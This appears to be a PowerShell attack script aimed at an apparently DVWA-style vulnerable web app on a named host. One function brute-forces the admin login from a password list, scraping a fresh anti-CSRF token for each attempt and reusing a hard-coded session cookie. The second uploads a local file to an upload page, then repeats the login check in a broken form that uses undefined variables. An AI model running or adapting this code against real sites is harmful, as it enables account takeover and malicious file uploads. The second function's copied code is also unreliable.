

function GuessPass {
    $list = @('12345678','abcdefgh','anywords','forever1','fantastic','superman','gosaints','tennineeight','sevensix','baseball','W0W$ers!!','p@ssword','p@$$W0rd','123478901234','whatever','123456','whattheheck','extracool','whoanowwhoa','getsomebruh','okiedokie','notthatspicy','$uper$ecret','barbeque1','rogerdodger')

    $list | %{
    
        $wc = New-Object Net.WebClient
        $wc.Headers['User-Agent']  = "xxxx"
        $wc.Headers['Cookie']      = "PHPSESSID=0gbg1r07eetum8lr94mv0ocf63; security=high"
        $res      = $wc.DownloadString("http://unioncentralorchids.com:39560/vulnerabilities/brute/")
        $pattern  = [Regex]::new('[a-zA-Z0-9]{32}')
        $token    = $pattern.Matches($res).Value

        $url = "http://unioncentralorchids.com:39560/vulnerabilities/brute/?username=admin&password=$_&Login=Login&user_token=$token"

        $wc.Headers['User-Agent']  = "xxxx"
        if ($wc.DownloadString($url).Contains("incorrect")) {
            Write-Host -Fore Gray "[-] Failed with password $_"
            Start-Sleep 4
        }
        else {
            Write-Host -Fore Green "[!] Password Found: $_"
            Break
        }
    }
}

function UploadPic {

    $wc = New-Object Net.WebClient
    $wc.Headers['User-Agent']  = "xxxx"
    $wc.Headers['Cookie']      = "PHPSESSID=0gbg1r07eetum8lr94mv0ocf63; security=high"
    # $wc.Headers['Content-Type']= "image/jpeg"
    # $wc.Headers['Accept']      = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    # $wc.Headers['Accept-Encoding'] = "gzip, deflate"
    # $wc.Headers['Accept-Language'] = "en-US,en;q=0.9"
    # $wc.Headers['Cache-Control']   = "no-cache"
    # $wc.Headers['Content-Type']    = "multipart/form-data; boundary=----WebKitFormBoundaryN5HKqivBXNz1GIP2"
    # $wc.Headers['Host']         = "unioncentralorchids.com:39560"
    # $wc.Headers['Origin']       = "http://unioncentralorchids.com:39560"
    $r = $wc.UploadFile("http://unioncentralorchids.com:39560/vulnerabilities/upload/","C:\Users\Public\img.jpg")
    

    $pattern  = [Regex]::new('[a-zA-Z0-9]{32}')
    $token    = $pattern.Matches($res).Value

    $url = "http://unioncentralorchids.com:39560/vulnerabilities/brute/?username=admin&password=$_&Login=Login&user_token=$token"

    $wc.Headers['User-Agent']  = "xxxx"
    if ($wc.DownloadString($url).Contains("incorrect")) {
        Write-Host -Fore Gray "[-] Failed with password $_"
        Start-Sleep 4
    }
    else {
        Write-Host -Fore Green "[!] Password Found: $_"
        Break
    }
    
}


